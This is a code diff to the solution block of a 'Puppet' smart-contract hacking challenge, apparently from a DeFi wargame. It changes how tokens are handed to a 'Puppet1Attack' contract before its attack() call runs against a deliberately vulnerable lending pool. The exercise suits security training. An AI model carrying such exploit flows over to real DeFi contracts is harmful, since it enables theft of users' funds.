@@ -95,14 +95,6 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        let attackContractAddress = ethers.utils.getContractAddress({
-            from: deployer.address, 
-            nonce: await ethers.provider.getTransactionCount(deployer.address)
-        })
-
-        console.log('attackContractAddress :>> ', attackContractAddress);
-        await token.connect(player).approve(attackContractAddress, PLAYER_INITIAL_TOKEN_BALANCE)
-        
         let puppetAttack = await (await ethers.getContractFactory('Puppet1Attack', deployer)).deploy(
             token.address,
             uniswapExchange.address,
@@ -110,12 +102,11 @@ describe('[Challenge] Puppet', function () {
             player.address
         );
 
+        token.connect(player).transfer(puppetAttack.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
         await puppetAttack.attack()
 
         console.log('puppetAttack.address :>> ', puppetAttack.address);
-        
-
-
     });
 
     after(async function () {
